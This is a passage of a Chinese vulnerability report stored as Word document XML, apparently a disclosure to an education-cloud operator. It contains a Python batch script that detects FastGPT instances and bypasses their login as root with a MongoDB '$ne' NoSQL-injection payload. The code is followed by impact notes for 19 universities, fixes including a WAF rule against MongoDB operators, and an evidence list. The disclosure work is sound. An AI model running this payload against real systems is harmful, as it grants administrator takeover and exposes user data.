      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># 归并 www/非www 与同主体前缀</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>seen, targets = set(), []</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>for h in hosts:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    key = h.replace('://www.', '://')</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    if key in seen: continue</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    seen.add(key); targets.append(h)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>print('去重后测试目标:', len(targets))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>results = []</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>s = requests.Session()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>for t in targets:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    r = {'target': t}</w:t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g = s.get(t, timeout=12, verify=False)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        r['home'] = g.status_code</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        if g.status_code != 200:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            r['skip'] = 'home not 200'; results.append(r); continue</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        init = s.get(t.rstrip('/') + '/api/common/system/getInitData', timeout=12, verify=False)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        if init.status_code == 200 and '"feConfigs"' in init.text:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            r['fastgpt'] = True</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            login = t.rstrip('/') + '/api/support/user/account/loginByPassword'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            ctrl = {"username": "root_ne_probe", "password": {"$ne": ""}}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            c = s.post(login, json=ctrl, timeout=12, verify=False)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            try: cc = c.json().get('code')</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            except Exception: cc = 'non-json'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            p = {"username": "root", "password": {"$ne": ""}}</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            rr = s.post(login, json=p, timeout=12, verify=False)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            try:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                d = rr.json()</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                if d.get('code') == 200 and (d.get('data') or {}).get('token'):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                    u = d['data']['user']</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                    r['VULNERABLE'] = True</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                    r['login_user'] = u.get('username')</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                    r['team_member'] = (u.get('team') or {}).get('memberName')</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                else:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                    r['VULNERABLE'] = False</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                    r['resp_code'] = d.get('code'); r['resp_statusText'] = d.get('statusText')</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                    r['ctrl_code'] = cc</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            except Exception:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">                r['VULNERABLE'] = False; r['note'] = 'login non-json'</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            r['fastgpt'] = False</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    except Exception as e:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        r['error'] = str(e)[:100]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    results.append(r)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(json.dumps(r, ensure_ascii=False))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    time.sleep(1.5)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>json.dump(results, open('fofa_pool/zxk_results.json', 'w'), ensure_ascii=False, indent=1)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>vul = [r for r in results if r.get('VULNERABLE')]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>print('='*40); print('漏洞实例数:', len(vul))</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>for v in vul: print(' ', v['target'], v.get('login_user'), v.get('team_member'))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六、危害说明（摘要）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>1. 零门槛夺取平台超级管理员权限：一次请求即可绕过认证以 root/Owner 登录，全部租户的用户管理、应用配置、知识库、API 密钥落入攻击者控制，并可创建账号长期驻留；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>2. 一次利用、19 校同时沦陷：多租户教育云全部高校入口共用同一后端与同一 root 账号，攻破入口即等于同时接管 19 所高校官方 AI 应用，受影响师生规模以万计；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>3. 高校官方名义钓鱼：可篡改任意高校入口的 AI 问答知识库，以学校官方名义向师生输出伪造教务通知、奖助学金信息或钓鱼内容，师生对「学校官方 AI 入口」信任度高，社会危害大；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>4. 师生个人信息全量泄露风险：root 权限可读取全部租户用户数据与教学问答内容，涉及《个人信息保护法》第 51 条合规义务；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>5. 横向扩散：平台配置的模型 API 密钥、Webhook、外部连接信息可被读取，用于冒用平台或高校身份或进一步渗透。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>（完整论证见同目录《智学客教育云_FastGPT登录NoSQLi_危害说明.docx》）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七、修复建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>1. 立即将平台 FastGPT 升级至 4.14.9.5 及以上版本，同步修复登录与聊天记录接口同类缺陷；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>2. 修复前临时关闭受影响入口公网访问或加来源白名单；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>3. 服务端对登录接口强制参数类型校验（password 必须为非空字符串），WAF 层拦截含 $ne/$gt/$regex/$where 等 MongoDB 操作符的请求体；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>4. 排查平台历史登录与访问日志，修改 root 及全部管理员口令，轮换全部 API 密钥；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>5. 通知受影响高校排查数据泄露情况；如确认数据被读取或平台遭篡改，按数据安全事件流程处置并上报。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八、证据附件清单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>1. 本复现过程文档（含截图 3 张：POC 与注入原理、对目标入口执行验证、注入成功判定 root/Owner 登录）；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>2. 利用过程完整录屏 evidence/QQ20261012-180353-HD.mp4（2026-10-12 录制）；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>3. 19 入口批量验证结果 evidence/入口点清单.md（含同一后端 root _id 相同的关键证据）；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>4. 请求响应原始报文 evidence/请求响应包.txt（含负面对照组）；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>5. POC 源码 poc/check_cve_2026_40351.py、poc/batch_scan_zxkedu.py；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>6. 《智学客教育云_FastGPT登录NoSQLi_危害说明.docx》。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="宋体"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>验证过程仅执行只读登录验证与权限字段读取，未读取业务数据内容，未做任何写入或破坏性操作。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